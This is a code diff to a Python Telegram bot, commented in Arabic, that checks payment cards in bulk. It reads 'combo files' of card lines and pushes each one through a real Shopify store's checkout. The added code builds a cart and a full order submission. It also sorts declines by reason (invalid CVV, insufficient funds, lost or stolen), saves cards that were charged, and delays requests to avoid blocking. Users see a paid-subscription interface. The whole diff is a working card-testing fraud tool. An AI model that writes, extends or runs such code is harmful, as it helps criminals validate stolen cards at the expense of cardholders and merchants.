@@ -734,7 +734,38 @@ class RealPayPalGateway:
             
             user_info = self.generate_user_info()
             
-            # الخطوة 1: إنشاء جلسة البطاقة
+            # الخطوة 1: إنشاء سلة التسوق
+            cart_headers = {
+                'authority': 'body-pleasure-piercing-online.myshopify.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/json',
+                'origin': 'https://body-pleasure-piercing-online.myshopify.com',
+                'user-agent': user,
+            }
+            
+            # إضافة منتج للسلة
+            cart_data = {
+                'items': [{
+                    'id': 34206247485484,
+                    'quantity': 1
+                }]
+            }
+            
+            cart_response = r.post(
+                'https://body-pleasure-piercing-online.myshopify.com/cart/add.js',
+                headers=cart_headers,
+                json=cart_data
+            )
+            
+            # الخطوة 2: الحصول على checkout
+            checkout_response = r.get(
+                'https://body-pleasure-piercing-online.myshopify.com/cart',
+                headers=cart_headers,
+                allow_redirects=True
+            )
+            
+            # الخطوة 3: إنشاء جلسة البطاقة
             headers1 = {
                 'authority': 'checkout.pci.shopifyinc.com',
                 'accept': 'application/json',
@@ -769,15 +800,39 @@ class RealPayPalGateway:
             response1 = r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers1, json=json_data1)
             
             if response1.status_code != 200:
-                return {'status': 'ERROR', 'message': '❌ Failed to create session', 'code': 'ERROR'}, user_info
+                # تحليل رسالة الخطأ
+                try:
+                    error_data = response1.json()
+                    if 'error' in error_data:
+                        error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                        return self._parse_shopify_error(error_msg), user_info
+                except:
+                    pass
+                return {'status': 'ERROR', 'message': f'❌ Session Error ({response1.status_code})', 'code': 'ERROR'}, user_info
             
             session_data = response1.json()
             session_id = session_data.get('id', '')
+            payment_method_id = session_data.get('payment_method_identifier', session_id)
             
             if not session_id:
                 return {'status': 'ERROR', 'message': '❌ No session ID returned', 'code': 'ERROR'}, user_info
             
-            # الخطوة 2: تقديم الطلب
+            # تحليل استجابة الجلسة للتحقق من صحة البطاقة
+            session_text = str(session_data).upper()
+            if 'INVALID' in session_text or 'ERROR' in session_text:
+                return self._parse_shopify_error(str(session_data)), user_info
+            
+            # الخطوة 4: تقديم الطلب مع البيانات الكاملة
+            stable_id = str(uuid.uuid4())
+            
+            cookies = {
+                'localization': 'AU',
+                'cart_currency': 'AUD',
+                '_shopify_y': str(uuid.uuid4()),
+                '_shopify_s': str(uuid.uuid4()),
+                'skip_shop_pay': 'false',
+            }
+            
             headers2 = {
                 'authority': 'body-pleasure-piercing-online.myshopify.com',
                 'accept': 'application/json',
@@ -804,6 +859,91 @@ class RealPayPalGateway:
                         'sessionInput': {
                             'sessionToken': session_id,
                         },
+                        'queueToken': None,
+                        'discounts': {
+                            'lines': [],
+                            'acceptUnexpectedDiscounts': True,
+                        },
+                        'delivery': {
+                            'deliveryLines': [
+                                {
+                                    'destination': {
+                                        'streetAddress': {
+                                            'address1': 'New York State',
+                                            'address2': '',
+                                            'city': 'New York',
+                                            'countryCode': 'US',
+                                            'postalCode': '10080',
+                                            'firstName': user_info['first_name'],
+                                            'lastName': user_info['last_name'],
+                                            'zoneCode': 'NY',
+                                            'phone': '+12702871380',
+                                            'oneTimeUse': False,
+                                        },
+                                    },
+                                    'selectedDeliveryStrategy': {
+                                        'deliveryStrategyByHandle': {
+                                            'handle': 'f17125499bce1813917061569d00dae0-30fa004dab6717298f0a6eb2433e42a3',
+                                            'customDeliveryRate': False,
+                                        },
+                                        'options': {},
+                                    },
+                                    'targetMerchandiseLines': {
+                                        'lines': [
+                                            {
+                                                'stableId': stable_id,
+                                            },
+                                        ],
+                                    },
+                                    'deliveryMethodTypes': [
+                                        'SHIPPING',
+                                    ],
+                                    'expectedTotalPrice': {
+                                        'value': {
+                                            'amount': '32.13',
+                                            'currencyCode': 'USD',
+                                        },
+                                    },
+                                    'destinationChanged': False,
+                                },
+                            ],
+                            'noDeliveryRequired': [],
+                            'useProgressiveRates': False,
+                            'prefetchShippingRatesStrategy': None,
+                            'supportsSplitShipping': True,
+                        },
+                        'merchandise': {
+                            'merchandiseLines': [
+                                {
+                                    'stableId': stable_id,
+                                    'merchandise': {
+                                        'productVariantReference': {
+                                            'id': 'gid://shopify/ProductVariantMerchandise/34206247485484',
+                                            'variantId': 'gid://shopify/ProductVariant/34206247485484',
+                                            'properties': [],
+                                            'sellingPlanId': None,
+                                            'sellingPlanDigest': None,
+                                        },
+                                    },
+                                    'quantity': {
+                                        'items': {
+                                            'value': 1,
+                                        },
+                                    },
+                                    'expectedTotalPrice': {
+                                        'value': {
+                                            'amount': '8.57',
+                                            'currencyCode': 'USD',
+                                        },
+                                    },
+                                    'lineComponentsSource': None,
+                                    'lineComponents': [],
+                                },
+                            ],
+                        },
+                        'memberships': {
+                            'memberships': [],
+                        },
                         'payment': {
                             'totalAmount': {
                                 'any': True,
@@ -812,7 +952,7 @@ class RealPayPalGateway:
                                 {
                                     'paymentMethod': {
                                         'directPaymentMethod': {
-                                            'paymentMethodIdentifier': session_id,
+                                            'paymentMethodIdentifier': payment_method_id,
                                             'sessionId': session_id,
                                             'billingAddress': {
                                                 'streetAddress': {
@@ -827,11 +967,27 @@ class RealPayPalGateway:
                                                     'phone': '+12702871380',
                                                 },
                                             },
+                                            'cardSource': None,
                                         },
+                                        'giftCardPaymentMethod': None,
+                                        'redeemablePaymentMethod': None,
+                                        'walletPaymentMethod': None,
+                                        'walletsPlatformPaymentMethod': None,
+                                        'localPaymentMethod': None,
+                                        'paymentOnDeliveryMethod': None,
+                                        'paymentOnDeliveryMethod2': None,
+                                        'manualPaymentMethod': None,
+                                        'customPaymentMethod': None,
+                                        'offsitePaymentMethod': None,
+                                        'customOnsitePaymentMethod': None,
+                                        'deferredPaymentMethod': None,
+                                        'customerCreditCardPaymentMethod': None,
+                                        'paypalBillingAgreementPaymentMethod': None,
+                                        'remotePaymentInstrument': None,
                                     },
                                     'amount': {
                                         'value': {
-                                            'amount': '8.57',
+                                            'amount': '40.7',
                                             'currencyCode': 'USD',
                                         },
                                     },
@@ -857,15 +1013,67 @@ class RealPayPalGateway:
                                 'countryCode': 'US',
                             },
                             'email': user_info['email'],
+                            'emailChanged': False,
+                            'phoneCountryCode': 'US',
+                            'marketingConsent': [
+                                {
+                                    'email': {
+                                        'value': user_info['email'],
+                                    },
+                                },
+                            ],
+                            'shopPayOptInPhone': {
+                                'number': '+12702871380',
+                                'countryCode': 'US',
+                            },
+                            'rememberMe': False,
                         },
+                        'tip': {
+                            'tipLines': [],
+                        },
+                        'taxes': {
+                            'proposedAllocations': None,
+                            'proposedTotalAmount': {
+                                'value': {
+                                    'amount': '0',
+                                    'currencyCode': 'USD',
+                                },
+                            },
+                            'proposedTotalIncludedAmount': None,
+                            'proposedMixedStateTotalAmount': None,
+                            'proposedExemptions': [],
+                        },
+                        'note': {
+                            'message': None,
+                            'customAttributes': [],
+                        },
+                        'localizationExtension': {
+                            'fields': [],
+                        },
+                        'nonNegotiableTerms': None,
+                        'scriptFingerprint': {
+                            'signature': None,
+                            'signatureUuid': None,
+                            'lineItemScriptChanges': [],
+                            'paymentScriptChanges': [],
+                            'shippingScriptChanges': [],
+                        },
+                        'optionalDuties': {
+                            'buyerRefusesDuties': False,
+                        },
+                        'cartMetafields': [],
                     },
+                    'attemptToken': f'{stable_id[:20]}-{uuid.uuid4().hex[:12]}',
+                    'metafields': [],
                 },
                 'operationName': 'SubmitForCompletion',
+                'id': 'd32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59',
             }
             
             response2 = r.post(
                 'https://body-pleasure-piercing-online.myshopify.com/checkouts/internal/graphql/persisted',
                 params=params,
+                cookies=cookies,
                 headers=headers2,
                 json=json_data2,
             )
@@ -873,7 +1081,30 @@ class RealPayPalGateway:
             return self._parse_shopify_response(response2.text), user_info
             
         except Exception as e:
-            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
+            return {'status': 'ERROR', 'message': f'❌ Gateway Error', 'code': 'ERROR'}, None
+    
+    def _parse_shopify_error(self, text):
+        """تحليل أخطاء Shopify"""
+        text = str(text).upper()
+        
+        if 'INVALID_NUMBER' in text or 'INCORRECT_NUMBER' in text or 'INVALID NUMBER' in text:
+            return {'status': 'INVALID_NUMBER', 'message': '❌ Invalid Card Number', 'code': 'DECLINED'}
+        elif 'INVALID_EXPIRY' in text or 'EXPIRED' in text or 'EXPIRY' in text:
+            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
+        elif 'INVALID_CVC' in text or 'INCORRECT_CVC' in text or 'CVV' in text or 'CVC' in text:
+            return {'status': 'CVV_FAILURE', 'message': '❌ Invalid CVV', 'code': 'DECLINED'}
+        elif 'CARD_DECLINED' in text or 'DECLINED' in text:
+            return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}
+        elif 'INSUFFICIENT' in text:
+            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
+        elif 'DO_NOT_HONOR' in text or 'DO NOT HONOR' in text:
+            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
+        elif 'FRAUD' in text:
+            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
+        elif 'LOST' in text or 'STOLEN' in text:
+            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen Card', 'code': 'DECLINED'}
+        else:
+            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}
     
     def _parse_shopify_response(self, text):
         """تحليل استجابة Shopify"""
@@ -1075,9 +1306,17 @@ async def format_card_result(card_line, result):
 
 async def process_combo_file(file_path, user_id, message, gateway_type="crisiscafe", bot=None):
     """معالجة ملف كومبو"""
-    valid_count = 0
+    charged_count = 0
+    approved_count = 0
+    declined_count = 0
     total_count = 0
     stopped = False
+    current_card = ""
+    current_status = ""
+    
+    # الحصول على وقت الاشتراك المتبقي (مثال)
+    subscription_time = "57m left"
+    points = 0
     
     try:
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
@@ -1095,30 +1334,53 @@ async def process_combo_file(file_path, user_id, message, gateway_type="crisisca
                 continue
             
             total_count += 1
-            
-            # تحديث الرسالة مع زر الإيقاف
-            if i % 3 == 0 or i == len(lines):
-                keyboard = InlineKeyboardBuilder()
-                keyboard.add(
-                    InlineKeyboardButton(text="⏹️ إيقاف الفحص", callback_data=f"stop_combo:{user_id}")
-                )
-                
-                status_msg = f"⏳ Processing... [{total_count}/{total_lines}]\n✅ Valid: {valid_count} | ❌ Invalid: {total_count - valid_count}\n\n🔴 اضغط الزر لإيقاف الفحص"
-                try:
-                    await message.edit_text(status_msg, reply_markup=keyboard.as_markup())
-                except:
-                    pass
+            current_card = line.strip()
             
             # معالجة البطاقة
             result = gateway.process_single_card(line.strip(), gateway_type)
+            current_status = result.get('status', 'UNKNOWN')
+            
+            # تحديث العدادات
+            if result['status'] == 'CHARGED':
+                charged_count += 1
+                await save_valid_card(line.strip(), result)
+            elif result['status'] in ['APPROVED', 'CVV_FAILURE']:
+                approved_count += 1
+            else:
+                declined_count += 1
             
             # تحديث الإحصائيات
             await update_user_stats(user_id, result)
             
-            # حفظ البطاقات الصالحة
-            if result['status'] == 'CHARGED':
-                valid_count += 1
-                await save_valid_card(line.strip(), result)
+            # تحديث الرسالة مع الواجهة الجديدة
+            if i % 2 == 0 or i == len(lines) or i == 1:
+                # إنشاء الأزرار
+                keyboard = InlineKeyboardBuilder()
+                keyboard.row(
+                    InlineKeyboardButton(text=f"💰 Charged ➜ [ {charged_count} ]", callback_data="stat_charged"),
+                    InlineKeyboardButton(text=f"✅ Approved ➜ [ {approved_count} ]", callback_data="stat_approved")
+                )
+                keyboard.row(
+                    InlineKeyboardButton(text=f"❌ Declined ➜ [ {declined_count} ]", callback_data="stat_declined"),
+                    InlineKeyboardButton(text=f"📁 Cards ➜ [ {total_count}/{total_lines} ]", callback_data="stat_cards")
+                )
+                keyboard.row(
+                    InlineKeyboardButton(text=f"💎 Points ➜ [ 🕐 Subscribed ({subscription_time}) 💎 ]", callback_data="stat_points")
+                )
+                keyboard.row(
+                    InlineKeyboardButton(text="🚫 STOP", callback_data=f"stop_combo:{user_id}")
+                )
+                
+                # تنسيق الرسالة
+                status_msg = (
+                    f"💳 {current_card}\n\n"
+                    f"📊 Status: {current_status}"
+                )
+                
+                try:
+                    await message.edit_text(status_msg, reply_markup=keyboard.as_markup())
+                except:
+                    pass
             
             # تأخير بين البطاقات لتجنب الحظر
             await asyncio.sleep(2)
@@ -1127,7 +1389,7 @@ async def process_combo_file(file_path, user_id, message, gateway_type="crisisca
         if user_id in user_sessions:
             user_sessions[user_id]['stop_combo'] = False
         
-        return valid_count, total_count, stopped
+        return charged_count + approved_count, total_count, stopped
         
     except Exception as e:
         logger.error(f"Error processing combo file: {e}")
